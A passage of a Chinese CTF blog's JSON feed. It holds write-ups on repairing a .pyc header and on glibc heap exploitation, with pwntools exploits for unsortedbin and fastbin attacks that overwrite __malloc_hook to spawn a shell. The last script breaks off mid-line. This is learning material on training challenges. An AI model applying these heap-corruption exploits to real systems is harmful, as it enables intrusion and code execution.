{
    "version": "https://jsonfeed.org/version/1",
    "title": "岁余的博客",
    "description": "welcome",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/",
            "url": "http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/",
            "title": "pyc文件头修复",
            "date_published": "2023-05-13T08:45:51.000Z",
            "content_html": "<p>首先题目给了 pyc 文件为 python 37</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164118025.png\" alt=\"image-20230513164118025\"></p>\n<p>然后 010editor 打开</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164147988.png\" alt=\"image-20230513164147988\"></p>\n<p>发现文件头为 00  到 E3 那里都是 0  猜测文件头损坏</p>\n<pre><code>enum PycMagic &#123;\n    MAGIC_1_0 = 0x00999902,\n    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */\n    MAGIC_1_3 = 0x0A0D2E89,\n    MAGIC_1_4 = 0x0A0D1704,\n    MAGIC_1_5 = 0x0A0D4E99,\n    MAGIC_1_6 = 0x0A0DC4FC,\n\n    MAGIC_2_0 = 0x0A0DC687,\n    MAGIC_2_1 = 0x0A0DEB2A,\n    MAGIC_2_2 = 0x0A0DED2D,\n    MAGIC_2_3 = 0x0A0DF23B,\n    MAGIC_2_4 = 0x0A0DF26D,\n    MAGIC_2_5 = 0x0A0DF2B3,\n    MAGIC_2_6 = 0x0A0DF2D1,\n    MAGIC_2_7 = 0x0A0DF303,\n\n    MAGIC_3_0 = 0x0A0D0C3A,\n    MAGIC_3_1 = 0x0A0D0C4E,\n    MAGIC_3_2 = 0x0A0D0C6C,\n    MAGIC_3_3 = 0x0A0D0C9E,\n    MAGIC_3_4 = 0x0A0D0CEE,\n    MAGIC_3_5 = 0x0A0D0D16,\n    MAGIC_3_5_3 = 0x0A0D0D17,\n    MAGIC_3_6 = 0x0A0D0D33,\n    MAGIC_3_7 = 0x0A0D0D42,\n    MAGIC_3_8 = 0x0A0D0D55,\n    MAGIC_3_9 = 0x0A0D0D61,\n&#125;;\n</code></pre>\n<p>这些事常用的 python 文件头  修改文件头为 MAGIC_3_7 注意小端序也就是 42 0D 0D 0A</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164325195.png\" alt=\"image-20230513164325195\"></p>\n<p>uncompyle6 -o <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3QucHk=\">test.py</span> 2.pyc</p>\n<p>然后使用 uncompyle6 即可成功反编译出来源码  uncompyle6 使用 pip install uncompyle6 安装</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/05/11/unsorted%20bin%20attack/",
            "url": "http://example.com/2023/05/11/unsorted%20bin%20attack/",
            "title": "unsortedbin attack",
            "date_published": "2023-05-11T13:26:54.000Z",
            "content_html": "<h2 id=\"unsortedbin-attack\"><a class=\"markdownIt-Anchor\" href=\"#unsortedbin-attack\">#</a> unsortedbin attack</h2>\n<p>Unsorted Bin Attack 从字面上就可以看出，正合适一种针对 Unsorted Bin 机制的攻击手法。这种攻击手法实现的前提是能够控制挂进 unsorted bin 中的 chunk 的 bk 指针，在控制 bk 指针的情况下可以实现修改任意地址值为一个较大的数值</p>\n<p>首先没有 chunk 挂入的时候 unsorted bin 的 fd 和 bk 指向自己</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511195726092.png\" alt=\"image-20230511195726092\"></p>\n<p>如果有一个 chunk 进入 unsorted bin 时那么该春 chunk 的 fd 和 bk 都会指向 unsorted bin</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200319409.png\" alt=\"image-20230511200319409\"></p>\n<p>fd 和 bk 指向 unsortedbin 的头</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200339778.png\" alt=\"image-20230511200339778\"></p>\n<p>如果你修改 chunk400 的 bk 为 magic-0x10  也就是你 free 之后的 chunk_400 的 bk 为 magic-0x10 那么你就可以修改 magic 的值为较大值</p>\n<p>为什么减去 0x10  因为 magic 的地址是 magic 的存储地址  而减去 0x10 之后的值才是 magic 的 malloc 之后的头地址  也就是 prev_size 的地址</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511202116589.png\" alt=\"image-20230511202116589\"></p>\n<p>然后你重新申请一个堆块  假设 chunk_400 的大小为 0x80  那么你重新申请一个 0x80 大小的堆块  就会把 chunl_400 申请走</p>\n<p>然后 magic-0x10 的这个堆块还在 那么 unsorted bin 的 fd 和 bk 就会指向 magic-0x10 的地方  然后 magic-0x10 的 fd 指针也就是 magic</p>\n<p>就会指向 unsorted bin  同时 magic 的值就会改变为较大的值</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203517278.png\" alt=\"image-20230511203517278\"></p>\n<p>修改前 chunk2 的 fd 和 bk 指向 unsorted bin 的头</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203637349.png\" alt=\"image-20230511203637349\"></p>\n<p>修改后 chunk2 的 bk 指向 0x602090 也就是 magic-0x10 处   magic 为 0x6020c0</p>\n<p>这个是修改前的 0x6020c0 的大小</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511204039362.png\" alt=\"image-20230511204039362\"></p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511212336461.png\" alt=\"image-20230511212336461\"></p>\n<p>这个是修改后的 0x6020c0 的大小</p>\n<p>add (0x80,‘dddd’)  只有申请一个新的堆块之后才能修改 magic 的值</p>\n<p>具体看前面  已经说过了</p>\n<p>buuctf hitcontraining_magicheap</p>\n<p>// 题目的 magic 地址为 0x6020c0  但是打远程的时候是 0x6020a0 不清楚为什么</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142800500.png\" alt=\"image-20230509142800500\"></p>\n<p>没有限制输入的数组大小所以存在堆溢出</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142849458.png\" alt=\"image-20230509142849458\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># r=process(\"1\")</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26699</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Heap : \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"heap:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Heap : \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"heap : \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'bbbb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">'cccc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>magic <span class=\"token operator\">=</span> <span class=\"token number\">0x6020A0</span><span class=\"token operator\">//</span>magic的地址  附件估计错了</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>magic<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'dddd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4869'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/17/Fastbin%20Attack/",
            "url": "http://example.com/2023/04/17/Fastbin%20Attack/",
            "title": "BUUCTF babyheap_0ctf_2017",
            "date_published": "2023-04-17T00:34:11.000Z",
            "content_html": "<h2 id=\"buuctf-babyheap_0ctf_2017\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-babyheap_0ctf_2017\">#</a> BUUCTF babyheap_0ctf_2017</h2>\n<p>首先申请了 4 个堆  然后 free (1) 和 free (2) 接着修改 #2 的 fd 指向 #4 所在的位置  制造出 #4 被 free 的假象</p>\n<p>然后修改 #4 的 size 位来避开 malloc 的检查。因为我们之后想在 chunk4 的地方重新 malloc</p>\n<p>但是 malloc 的时候会检查 size 是否和要分配的大小相同，这就是为什么上面代码中我们要把 chunk4 的 size 位修改为 0x21</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415220317229.png\" alt=\"image-20230415220317229\"></p>\n<p>然后重新申请了</p>\n<p>allocate(0x10)<br>\nallocate(0x10)</p>\n<p>这里可以看一下结构体内存位置 发现下标为 1 和下标为 2 的内存全为 0 也就是都被 free 掉了</p>\n<p>所以第一个 allocate (0x10) 的内存地址指向下标为 1 的</p>\n<p>第二个 alloca (0x10) 虽然是在 #4 堆块申请了地址 但是会去到下标为 2 的结构体中  但是内存地址指向了 #4 所在的内存地址</p>\n<p>可以用这个看结构体所在位置  一般第一个就是的</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221026909.png\" alt=\"image-20230415221026909\"></p>\n<p>x/1000gx 0x321776f75000  尽量多向后找点</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221139838.png\" alt=\"image-20230415221139838\"></p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221337737.png\" alt=\"image-20230415221337737\"></p>\n<p>可以看到 allocate 后下标为 2 的结构体内存地址指向堆块 #4 和下标为 4 指向的堆块一样</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>0fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>1、fill (3,payload) 其实是将 chunk4 的 size 位变为之前的 0x91<br>\n2、allocate (0x80) 用来分割 top chunk 和 chunk4，防止堆块合并，因为我们后面要 free (4)<br>\n 3、free (4) 之后，chunk4 会被放到 unsorted bin 中。此时 chunk4 的 fd 指针是 unsorted bin 链表的头部，这个地址为 main_arena + 0x58</p>\n<p>可以看到 0x91 那里已经 free 了所以不能 dump 输出</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211452367.png\" alt=\"image-20230416211452367\"></p>\n<p>同时查看内存发现 index 为 4 那里为空证明已经被 free 了 而 index 为 2 那里的内存指向 index4 所以可以 dump 出来</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211534372.png\" alt=\"image-20230416211534372\"></p>\n<p>然后查看结构体中的内存地址 不是堆中的 可以发现下标为 2 的内存地址指向下标为 4 的所以 dump 输出时输出下标为 2 的</p>\n<p>可以输出 chunk4 中的内容</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>malloc_hook<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">88</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>libc_base<span class=\"token operator\">=</span>malloc_hook<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>因为 dump (2) 那里会输出 main_arena + 0x58 的地址所以需要减去 0x58 再减去 0x10 会找到 malloc_hook 的地址</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416212411772.png\" alt=\"image-20230416212411772\"></p>\n<p>然后 libcbase 的偏移就可以算出来了</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>此时 chunk4 是 unsorted bin。大小为 0x80，此时我们需要分配 0x60。会从 chunk4 里分割出来。我们把他定义为 chunk6，虽然是 chunk6，但是他在结构体数组中的索引为 4。因为 index 为 4 那里为空  所以他的内存地址为 chunk4</p>\n<p>free (4)  4 是下标为 4 所以 free 的是才申请的 chunk6</p>\n<p>这两步主要用来将 chunk4 分离出一个 fasbin 大小的 chunk6，然后再 free。chunk6 进入 fastbin。之后我们可以通过修改 chunk2 修改 chunk6 的值，然后再 malloc，进行 fastbin attack，可以任意地址分配。修改任意内存。</p>\n<p>我们现在需要修改 <code>__malloc_hook</code>  的值。我们先找到 <code>__malloc_hook</code>  的地址</p>\n<p>然后查看该 <code>__malloc_hook</code>  附近的内存空间。</p>\n<p>我们想要在这范围内进行 malloc，就需要绕过 malloc 的限制。我们发现附近 <code>7f</code>  比较多，我们可以找一个内存地址，将 <code>7f</code>  当为我们要 malloc 的 size 位。</p>\n<p>例如如下的内存地址， <code>0x7fd25e3b7aed</code> 。如果我们在这个地址进行 malloc，则 size 位为 0x7f。那我们分配一个 0x60 大小的 chunk，即可绕过 malloc 的限制。</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416213543205.png\" alt=\"image-20230416213543205\"></p>\n<p>最后一个字节是 7f 所以从 0x7f215166daed</p>\n<p>算出偏移为 0x3c4aed</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x3c4aed</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>第一个 allocate (0x60) 分配到 chunk6</p>\n<p>也就是下标为 4 的那里</p>\n<p>第二个 allocate (0x60) 分配的是下标为 6 的 chunk 这里可以动调看一下结构体内存就懂了</p>\n<p>修改完还没分配  可以看到 fd 那里是 libc_base+0x3c4aed</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416215139905.png\" alt=\"image-20230416215139905\"></p>\n<p>第二个 allocate (0x60) 直接看堆是看不到的  需要看结构体指针那里 前面说过怎么看  会发现他的内存地址为 libc_base+0x3c4aed+0x10</p>\n<p>为什么加了 0x10  可能是前面的下标和判断是否存在占了 0x10  具体还不是很懂</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416214511799.png\" alt=\"image-20230416214511799\"></p>\n<p>这里的 fill (6) 是修改的下标为 6 的结构体指针</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220041895.png\" alt=\"image-20230416220041895\"></p>\n<p>修改的是下标为 6 所指向的内存地址也就是 0x00007f1d82b46afd 所指向的</p>\n<p>这里因为中断了一下 所以内存地址变了  但还是上面那个 这个是修改前的</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220229133.png\" alt=\"image-20230416220229133\"></p>\n<p>这是修改后的</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416221513786.png\" alt=\"image-20230416221513786\"></p>\n<p>因为是倒序的所以 0d 对应 3 个 00 而 0e 对应两个 00 所以要 p8 (0)*3</p>\n<p>执行代码后，即可修改 **__malloc_hook** 的值，可以看到已经将__malloc_hook 修改为 one_gadget 了。下次调用 malloc 或者 calloc 的时候就可以获得 shell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r=remote(\"node4.buuoj.cn\",28959)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>r<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc-2.23.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">allocate</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    r<span class=\"token 